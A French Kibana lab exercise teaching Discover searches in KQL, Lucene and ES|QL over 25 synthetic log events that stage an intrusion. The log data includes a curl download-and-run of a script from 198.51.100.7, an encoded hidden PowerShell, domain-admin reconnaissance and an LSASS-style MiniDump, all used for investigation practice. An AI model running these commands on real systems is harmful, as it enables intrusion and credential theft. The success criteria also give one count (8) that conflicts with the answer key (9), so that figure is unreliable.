# TP 3 — Discover : KQL, Lucene, ES|QL

> Mener une première investigation dans Discover : personnaliser l'affichage, écrire des requêtes KQL et Lucene, puis passer à ES|QL.

**Topic** : Discover

## Contexte

Un collègue signale « des connexions bizarres sur web-01 ce matin ». Vous ouvrez Discover.

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

## Exercice 1 — Une data view

1. **Stack Management** → **Data views** → **Create data view**.
2. Nom : `Lab`, index pattern : `logs-lab-*`, timestamp : `@timestamp`.
3. Ouvrez **Discover**, choisissez la data view `Lab`, temps : **Last 4 hours**.

Vous devez voir **25** événements.

## Exercice 2 — Personnaliser l'affichage

1. Ajoutez les colonnes `host.name`, `user.name`, `event.category`, `event.outcome`, `source.ip`, `process.name`.
2. Cliquez sur le champ `host.name` dans la liste : combien d'hôtes ?
3. Enregistrez la recherche : **Save** → `Lab - all events`.

<details>
<summary>Réponse</summary>

Trois hôtes : `ws-02`, `web-01`, `db-01`.

</details>

## Exercice 3 — KQL

Écrivez, dans la barre de recherche (langage **KQL**), une requête pour chaque question :

1. Les échecs d'authentification.
2. Les échecs pour l'utilisateur `admin` depuis une IP **hors** `10.0.0.0/8`.
3. Les processus dont la ligne de commande contient `-enc`.
4. Les connexions vers un port supérieur ou égal à 443 venant de `ws-02`.

<details>
<summary>Réponse</summary>

1. `event.category: authentication and event.outcome: failure` — 5 événements
2. `event.outcome: failure and user.name: admin and not source.ip: 10.0.0.0/8` — 5
3. `process.command_line: *-enc*` — 1
4. `host.name: ws-02 and event.category: network and destination.port >= 443` — 9

</details>

## Exercice 4 — Lucene

Passez le langage en **Lucene** (menu de la barre de recherche) et réécrivez :

1. La requête 2 de l'exercice 3.
2. Les processus dont le nom correspond à l'expression régulière `power.*\.exe`.

Vérifiez dans Dev Tools — Elasticsearch exécute Lucene avec `query_string` :

```json
POST /logs-lab-default/_count
{
  "query": {
    "query_string": {
      "query": "event.outcome:failure AND user.name:admin AND NOT source.ip:\"10.0.0.0/8\""
    }
  }
}
```

Résultat attendu :

```json
{ "count": 5 }
```

```json
POST /logs-lab-default/_count
{
  "query": {
    "query_string": { "query": "process.name:/power.*\\.exe/" }
  }
}
```

Résultat attendu :

```json
{ "count": 1 }
```

## Exercice 5 — Filtres et documents voisins

1. Requête : `event.outcome: success and source.ip: 203.0.113.50`. Dépliez l'unique événement.
2. Sur `host.name`, **Filter for value** ; videz la requête : le filtre reste.
3. Ouvrez **View surrounding documents** : que fait `admin` juste après sa connexion ?

<details>
<summary>Réponse</summary>

Il télécharge un script (`curl -s http://198.51.100.7/x.sh -o /tmp/x.sh`) et l'exécute (`bash /tmp/x.sh`).

</details>

## Exercice 6 — ES|QL

Passez Discover en mode **ES|QL** et répondez :

1. Quels processus parlent à quelles IP, et combien de fois ?
2. Quel hôte a envoyé le plus d'octets vers l'extérieur ?

<details>
<summary>Réponse</summary>

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE event.category == "network"
    | STATS connections = COUNT(*) BY process.name, destination.ip
    | SORT connections DESC
  """
}
```

Résultat attendu (extrait) :

```json
{ "values": [[7, "updater.exe", "198.51.100.7"]] }
```

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE network.direction == "egress"
    | STATS sent = SUM(source.bytes) BY host.name
    | SORT sent DESC
    | LIMIT 1
  """
}
```

Résultat attendu :

```json
{ "values": [[48005120, "ws-02"]] }
```

</details>

## Exercice 7 — KQL dans ES|QL

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE KQL("event.outcome: failure and user.name: admin")
    | STATS failures = COUNT(*) BY source.ip
  """
}
```

Résultat attendu :

```json
{ "values": [[5, "203.0.113.50"]] }
```

## Critères de succès

- [ ] La data view `Lab` affiche 25 événements sur 4 heures
- [ ] Les 4 requêtes KQL renvoient 5, 5, 1 et 8 événements
- [ ] Vous savez quand passer à Lucene (regex, fuzzy)
- [ ] Vous avez trouvé `updater.exe` et `ws-02` avec ES|QL

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| « No results match your search criteria » | Sélecteur de temps | **Last 4 hours**, ou rechargez le setup |
| KQL ne trouve pas `Admin` | `keyword` sensible à la casse | `user.name: admin` |
| `process.command_line: -enc` ne trouve rien | Pas de jokers | `*-enc*` |

## Pour aller plus loin

- **Field statistics** (onglet de Discover) : distribution de chaque champ sur l'échantillon.
- Ajoutez la recherche `Lab - all events` à un dashboard au TP 4.
